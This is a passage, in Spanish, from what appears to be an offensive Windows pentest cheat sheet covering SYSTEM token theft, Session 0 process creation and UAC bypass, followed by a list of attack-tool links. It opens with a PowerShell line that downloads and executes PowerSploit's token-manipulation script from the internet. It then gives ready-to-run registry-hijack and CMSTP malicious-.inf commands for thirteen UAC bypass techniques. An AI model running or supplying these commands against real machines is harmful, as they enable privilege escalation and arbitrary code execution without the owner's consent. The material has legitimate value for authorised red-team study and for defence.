IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1')

# Listar procesos con token de SYSTEM
Invoke-TokenManipulation -Enumerate

# Duplicar token de winlogon.exe
Invoke-TokenManipulation -ProcessId (Get-Process -Name winlogon).Id

# Abrir ventana como SYSTEM
Invoke-TokenManipulation -CreateProcess "cmd.exe /c start calc.exe" -ProcessId (Get-Process -Name winlogon).Id
```

### 38.3 Session 0 Isolation Issues

```md
# Session 0 Isolation: desde Windows Vista, los servicios corren en Session 0
# y los usuarios en Session 1+. No pueden interactuar directamente.

# Pero hay excepciones:
# - Interactive Services Detection (no recomendado por MS)
# - UI Automation bridge
# - Windows 10/11 modo "Interactive services"

# Desde Session 0, podés:
# - Usar CreateProcessAsUser para crear proceso en session del usuario
# - Usar WTSQueryUserToken para obtener token del usuario logueado
# - Usar APIs de Window Station

# Ejemplo: crear proceso en session del usuario desde Session 0
# Código C++ en servicio:
HANDLE hToken = NULL;
DWORD sessionId = WTSGetActiveConsoleSessionId();
WTSQueryUserToken(sessionId, &hToken);
CreateProcessAsUser(hToken, "cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
```

### 38.4 GUI-Based UAC Bypass — Lista Completa

```cmd
# ====== MÉTODOS DE UAC BYPASS VÍA GUI ======
# Todos requieren que el usuario esté en Administrators

# === MÉTODO 1: Fodhelper (más confiable, Win 10/11) ===
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /c whoami > C:\Temp\output.txt" /f
C:\Windows\System32\fodhelper.exe
reg delete HKCU\Software\Classes\ms-settings\ /f

# === MÉTODO 2: EventVwr ===
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe /c whoami > C:\Temp\output.txt" /f
C:\Windows\System32\eventvwr.exe
reg delete HKCU\Software\Classes\mscfile\ /f

# === MÉTODO 3: SDCLT ===
reg add HKCU\Software\Classes\exefile\shell\open\command /d "cmd.exe /c whoami > C:\Temp\output.txt" /f
C:\Windows\System32\sdclt.exe
reg delete HKCU\Software\Classes\exefile\ /f

# === MÉTODO 4: ComputerDefaults ===
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /c whoami > C:\Temp\output.txt" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
C:\Windows\System32\ComputerDefaults.exe
reg delete HKCU\Software\Classes\ms-settings\ /f

# === MÉTODO 5: CMSTP (Connection Manager) ===
# Crear .inf malicioso
echo "[version]" > evil.inf
echo "Signature=$chicago$" >> evil.inf
echo "[DefaultInstall]" >> evil.inf
echo "CustomDestination=CustomDestination" >> evil.inf
echo "[CustomDestination]" >> evil.inf
echo "Name=All Users" >> evil.inf
echo "RunPostInstallCommands=Yes" >> evil.inf
echo "[PostInstall]" >> evil.inf
echo "cmd.exe /c whoami > C:\Temp\output.txt" >> evil.inf
cmstp.exe /s evil.inf

# === MÉTODO 6: SilentCleanup (Disk Cleanup Schedule) ===
reg add HKCU\Environment /v windir /t REG_SZ /d "cmd.exe /c whoami > C:\Temp\output.txt & " /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
reg delete HKCU\Environment /v windir /f

# === MÉTODO 7: WSReset (Windows Store Reset) ===
reg add HKCU\Software\Classes\AppXq0fevzme2pys62n3e0fbqa7peapykr8v\shell\open\command /d "cmd.exe /c whoami > C:\Temp\output.txt" /f
C:\Windows\System32\wsreset.exe
reg delete HKCU\Software\Classes\AppXq0fevzme2pys62n3e0fbqa7peapykr8v /f

# === MÉTODO 8: OpenSSH (si está instalado) ===
C:\Windows\System32\OpenSSH\ssh.exe -o "ProxyCommand cmd.exe /c whoami > C:\Temp\output.txt" localhost

# === MÉTODO 9: Disk Cleanup GUI (cleanmgr.exe) ===
# Con schedule task existente
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# === MÉTODO 10: Sysprep ===
C:\Windows\System32\sysprep\sysprep.exe /quiet /generalize /oobe /reboot
# No recomendado porque generaliza el sistema

# === MÉTODO 11: PrintUIEntry (Print Management) ===
rundll32 printui.dll,PrintUIEntry /q /in /n\\localhost\printer

# === MÉTODO 12: AppInfo (Interactive Services Detection) ===
# Más complejo, requiere servicio interactivo

# === MÉTODO 13: Consent Prompt Bypass (AutoElevate) ===
# Buscar binarios que AutoElevate directo a admin sin prompt
# Ejemplos: mmc.exe, CompMgmtLauncher.exe

# Check auto-elevate:
sigcheck64.exe -a C:\Windows\System32\*.exe | findstr "autoElevate"
# Buscar: autoElevate = true

# Si encontrás un binario auto-elevate, podés hacer:
# 1. DLL hijacking del binario
# 2. Modificar registry para que cargue tu DLL
# 3. Ejecutar el binario → se eleva → carga tu DLL como admin

# Ejemplo con msconfig.exe
# msconfig.exe auto-eleva y busca DLLs en ciertos paths
```

### 38.5 UAC Level Bypass (ConsentPromptBehaviorAdmin)

```cmd
# La efectividad del bypass depende del nivel de UAC
# Verificar nivel:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# Valores:
# 0 = Elevate without prompting (UAC desactivado)
# 1 = Prompt for credentials on secure desktop (pedir credenciales)
# 2 = Prompt for consent on secure desktop (pedir confirmación) ← DEFAULT
# 3 = Prompt for credentials (pedir credenciales, no secure desktop)
# 4 = Prompt for consent (pedir confirmación, no secure desktop)
# 5 = Prompt for consent for non-Windows binaries

# Los métodos fodhelper y eventvwr funcionan en niveles 1-5
# Solo en nivel 0 no funciona (porque UAC está desactivado)

# Si EnableLUA = 0, UAC está completamente deshabilitado:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
# 0 = UAC deshabilitado, 1 = UAC habilitado
```

---

## 39. Referencias y Recursos

- **Mimikatz**: https://github.com/gentilkiwi/mimikatz
- **PowerSploit**: https://github.com/PowerShellMafia/PowerSploit
- **BloodHound**: https://github.com/BloodHoundAD/BloodHound
- **BloodHound CE**: https://github.com/specterops/bloodhound-ce
- **SharpHound**: https://github.com/BloodHoundAD/SharpHound
- **Certify**: https://github.com/GhostPack/Certify
- **Rubeus**: https://github.com/GhostPack/Rubeus
- **Impacket**: https://github.com/fortra/impacket
- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec
- **Evil-WinRM**: https://github.com/Hackplayers/evil-winrm
- **SpoolSample**: https://github.com/leechristensen/SpoolSample
- **PetitPotam**: https://github.com/topotam/PetitPotam
- **Certipy**: https://github.com/ly4k/Certipy
- **ADCS ESC Guide**: https://posts.specterops.io/certified-pre-owned-d95910965cd2
- **AADInternals**: https://github.com/Gerenios/AADInternals
- **ROADtools**: https://github.com/dirkjanm/ROADtools
- **MailSniper**: https://github.com/dafthack/MailSniper
- **TokenTactics**: https://github.com/rvrsh3ll/TokenTactics
- **WSUS Attacks**: https://github.com/ctxis/WSUS-Attacks
- **PrivExchange**: https://github.com/dirkjanm/PrivExchange
- **AD Attack Defense**: https://github.com/infosecn1nja/AD-Attack-Defense
```

